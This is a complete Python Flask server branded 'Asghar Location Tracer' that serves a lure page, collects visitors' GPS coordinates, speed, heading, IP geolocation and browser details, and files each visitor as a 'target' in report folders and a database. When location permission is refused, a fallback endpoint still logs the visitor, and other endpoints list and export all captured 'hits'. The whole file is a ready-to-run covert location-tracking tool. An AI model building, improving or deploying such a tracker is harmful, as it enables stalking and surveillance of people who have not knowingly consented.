# ============================================================
#  ASGHAR LOCATION TRACER
#  Author  : ASGHAR
#  Version : 1.0.1
#  Repo    : github.com/<your-username>/asghar-location-tracer
#  © ASGHAR — All rights reserved
# ============================================================

import json
import os
import sys
import hashlib
import sqlite3
import urllib.request
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

# ─────────── AUTHOR ───────────
AUTHOR     = "ASGHAR"
BRAND      = "Asghar Location Tracer"
VERSION    = "1.0.1"
WATERMARK  = f"© {AUTHOR} — {BRAND} v{VERSION}"

_INTEGRITY_STRING = f"{AUTHOR}|{BRAND}|{VERSION}|built-by-asghar"
INTEGRITY_HASH = hashlib.sha256(_INTEGRITY_STRING.encode()).hexdigest()

def verify_integrity():
    check = hashlib.sha256(f"{AUTHOR}|{BRAND}|{VERSION}|built-by-asghar".encode()).hexdigest()
    if check != INTEGRITY_HASH:
        print("\n" + "!" * 60)
        print("  INTEGRITY CHECK FAILED")
        print("  This tool is property of ASGHAR.")
        print("!" * 60 + "\n")
        sys.exit(1)

verify_integrity()

# ─────────── SETUP ───────────
app = Flask(__name__, static_folder=".", static_url_path="")
CORS(app)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB = os.path.join(BASE_DIR, "locations.db")
LOG_DIR = os.path.join(BASE_DIR, "targets")
os.makedirs(LOG_DIR, exist_ok=True)

REQUIRED_COLUMNS = {
    "ip": "TEXT",
    "latitude": "REAL",
    "longitude": "REAL",
    "accuracy": "REAL",
    "source": "TEXT",
    "maps_link": "TEXT",
    "folder": "TEXT",
    "user_agent": "TEXT",
    "referer": "TEXT",
    "timestamp": "TEXT",
    "raw": "TEXT",
    "captured_by": "TEXT DEFAULT 'ASGHAR'",
}

def init_db():
    """Create table + migrate missing columns on old DB."""
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS hits (
            id INTEGER PRIMARY KEY AUTOINCREMENT
        )
    """)
    c.execute("PRAGMA table_info(hits)")
    existing = {row[1] for row in c.fetchall()}

    for col, coltype in REQUIRED_COLUMNS.items():
        if col not in existing:
            print(f"[db] migrating: adding column '{col}'")
            c.execute(f"ALTER TABLE hits ADD COLUMN {col} {coltype}")

    conn.commit()
    c.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='hits'")
    if not c.fetchone():
        conn.close()
        raise RuntimeError("could not create hits table")
    conn.close()
    print(f"[db] ready at {DB}")

init_db()

def client_ip():
    if request.headers.get("X-Forwarded-For"):
        return request.headers.get("X-Forwarded-For").split(",")[0].strip()
    return request.remote_addr

def get_ip_info(ip):
    try:
        with urllib.request.urlopen(f"http://ip-api.com/json/{ip}", timeout=5) as r:
            return json.loads(r.read().decode())
    except Exception as e:
        print("[ip-api error]", e)
        return {}

def make_folder_name(ip, lat=None, lon=None):
    ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    safe_ip = (ip or "unknown").replace(":", "-").replace(".", "_")
    geo = ""
    if lat is not None and lon is not None:
        geo = f"_{lat:.5f}_{lon:.5f}".replace("-", "m").replace(".", "")
    return f"{ts}_{safe_ip}{geo}"

def build_maps_link(lat, lon, ip_info=None):
    """Prefer GPS coords, then IP coords."""
    if lat is not None and lon is not None:
        return f"https://www.google.com/maps?q={lat},{lon}"
    if ip_info and ip_info.get("lat") and ip_info.get("lon"):
        return f"https://www.google.com/maps?q={ip_info['lat']},{ip_info['lon']}"
    return ""

def write_target_folder(folder_name, payload):
    folder_path = os.path.join(LOG_DIR, folder_name)
    os.makedirs(folder_path, exist_ok=True)

    with open(os.path.join(folder_path, "details.json"), "w", encoding="utf-8") as f:
        json.dump(payload, f, indent=2, ensure_ascii=False)

    lat = payload.get("latitude")
    lon = payload.get("longitude")
    maps_link = payload.get("maps_link", "")

    lines = []
    lines.append("=" * 62)
    lines.append(f"   {BRAND.upper()}")
    lines.append(f"   {WATERMARK}")
    lines.append("=" * 62)
    lines.append("")
    lines.append(" TARGET LOCATION REPORT")
    lines.append("-" * 62)
    lines.append(f"Captured by   : {AUTHOR}")
    lines.append(f"Captured at   : {payload.get('timestamp')}")
    lines.append(f"Source        : {payload.get('source')}")
    lines.append(f"IP Address    : {payload.get('ip')}")
    lines.append("")
    lines.append("--- COORDINATES ---")
    lines.append(f"Latitude      : {lat}")
    lines.append(f"Longitude     : {lon}")
    lines.append(f"Accuracy      : {payload.get('accuracy')} meters")
    lines.append(f"Altitude      : {payload.get('altitude')}")
    lines.append(f"Speed         : {payload.get('speed')}")
    lines.append(f"Heading       : {payload.get('heading')}")
    lines.append("")
    lines.append("--- MAP LINK ---")
    lines.append(f"{maps_link}")
    lines.append("")
    lines.append("--- IP GEOLOCATION ---")
    ip_info = payload.get("ip_info", {})
    if ip_info:
        for k, v in ip_info.items():
            lines.append(f"{k:14}: {v}")
    else:
        lines.append("(unavailable)")
    lines.append("")
    lines.append("--- DEVICE / BROWSER ---")
    lines.append(f"User Agent    : {payload.get('user_agent')}")
    lines.append(f"Platform      : {payload.get('platform')}")
    lines.append(f"Language      : {payload.get('language')}")
    lines.append(f"Referer       : {payload.get('referer')}")
    lines.append("")
    lines.append("--- RAW PAYLOAD ---")
    lines.append(json.dumps(payload, indent=2, ensure_ascii=False))
    lines.append("=" * 62)
    lines.append(f"   {WATERMARK}")
    lines.append("=" * 62)

    with open(os.path.join(folder_path, "report.txt"), "w", encoding="utf-8") as f:
        f.write("\n".join(lines))

    if maps_link:
        with open(os.path.join(folder_path, "maps_link.txt"), "w", encoding="utf-8") as f:
            f.write(f"# {WATERMARK}\n{maps_link}\n")

    return folder_path

def save_hit(payload):
    lat = payload.get("latitude")
    lon = payload.get("longitude")
    ip = payload.get("ip") or "unknown"
    ip_info = payload.get("ip_info") or {}

    maps_link = build_maps_link(lat, lon, ip_info)
    payload["maps_link"] = maps_link
    payload["captured_by"] = AUTHOR
    payload["tool"] = BRAND
    payload["watermark"] = WATERMARK

    folder_name = make_folder_name(ip, lat, lon)
    folder_path = write_target_folder(folder_name, payload)
    payload["folder"] = folder_path

    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("""
        INSERT INTO hits (ip, latitude, longitude, accuracy, source, maps_link, folder,
                          user_agent, referer, timestamp, raw, captured_by)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        ip, lat, lon, payload.get("accuracy"),
        payload.get("source", "gps"),
        maps_link, folder_path,
        payload.get("user_agent"),
        payload.get("referer"),
        payload.get("timestamp") or datetime.utcnow().isoformat(),
        json.dumps(payload, ensure_ascii=False),
        AUTHOR
    ))
    conn.commit()
    conn.close()

    print(f"[{AUTHOR}] capture: {ip} -> {maps_link}")
    print(f"[{AUTHOR}] folder : {folder_path}")
    return maps_link, folder_path

# ─────────── ROUTES ───────────

@app.route("/")
def index():
    return send_from_directory(".", "index.html")

@app.route("/favicon.ico")
def favicon():
    return ("", 204)

@app.route("/api/brand", methods=["GET"])
def brand():
    """Frontend uses this only for signature, not for visible display."""
    return jsonify({
        "version": VERSION,
        "signature": INTEGRITY_HASH[:16],
    })

@app.route("/api/ip-locate", methods=["GET"])
def ip_locate():
    ip = client_ip()
    info = get_ip_info(ip)
    info["ip"] = ip
    info["source"] = "ip"
    return jsonify(info)

@app.route("/api/gps", methods=["POST"])
def gps():
    data = request.get_json(force=True, silent=True) or {}
    ip = client_ip()
    ip_info = get_ip_info(ip)

    payload = {
        "ip": ip,
        "latitude": data.get("latitude"),
        "longitude": data.get("longitude"),
        "accuracy": data.get("accuracy"),
        "altitude": data.get("altitude"),
        "altitudeAccuracy": data.get("altitudeAccuracy"),
        "speed": data.get("speed"),
        "heading": data.get("heading"),
        "source": "gps",
        "user_agent": request.headers.get("User-Agent"),
        "referer": request.headers.get("Referer"),
        "platform": data.get("platform"),
        "language": data.get("language"),
        "timestamp": datetime.utcnow().isoformat(),
        "ip_info": ip_info,
        "raw_browser": data,
    }

    try:
        maps_link, folder = save_hit(payload)
        return jsonify({
            "status": "ok",
            "maps_link": maps_link,
            "folder": folder,
        })
    except Exception as e:
        print("[gps error]", e)
        return jsonify({"status": "error", "error": str(e)}), 500

@app.route("/api/ip-fallback", methods=["POST"])
def ip_fallback():
    data = request.get_json(force=True, silent=True) or {}
    ip = client_ip()
    ip_info = get_ip_info(ip)

    payload = {
        "ip": ip,
        "latitude": None,
        "longitude": None,
        "accuracy": 5000.0,
        "source": "ip",
        "user_agent": request.headers.get("User-Agent"),
        "referer": request.headers.get("Referer"),
        "platform": data.get("platform"),
        "language": data.get("language"),
        "timestamp": datetime.utcnow().isoformat(),
        "ip_info": ip_info,
        "reason": data.get("reason", "denied"),
    }

    try:
        maps_link, folder = save_hit(payload)
        return jsonify({
            "status": "logged",
            "maps_link": maps_link,
            "folder": folder,
        })
    except Exception as e:
        print("[ip-fallback error]", e)
        return jsonify({"error": str(e)}), 500

@app.route("/api/hits", methods=["GET"])
def hits():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("""SELECT id, ip, latitude, longitude, accuracy, source, maps_link,
                        folder, user_agent, timestamp, captured_by
                 FROM hits ORDER BY id DESC LIMIT 200""")
    rows = c.fetchall()
    conn.close()
    return jsonify([
        {"id": r[0], "ip": r[1], "lat": r[2], "lon": r[3], "accuracy": r[4],
         "source": r[5], "maps_link": r[6], "folder": r[7], "ua": r[8],
         "time": r[9], "captured_by": r[10]}
        for r in rows
    ])

@app.route("/api/export", methods=["GET"])
def export():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT * FROM hits ORDER BY id DESC")
    cols = [d[0] for d in c.description]
    rows = [dict(zip(cols, r)) for r in c.fetchall()]
    conn.close()
    return jsonify({
        "tool": BRAND,
        "author": AUTHOR,
        "watermark": WATERMARK,
        "exported_at": datetime.utcnow().isoformat(),
        "hits": rows,
    })

if __name__ == "__main__":
    print("=" * 62)
    print(f"   {BRAND}")
    print(f"   {WATERMARK}")
    print("=" * 62)
    print(f"[server] http://0.0.0.0:5000")
    print(f"[server] DB   : {DB}")
    print(f"[server] LOG  : {LOG_DIR}")
    print(f"[server] Owner: {AUTHOR}")
    print("=" * 62)
    app.run(host="0.0.0.0", port=5000, debug=False)
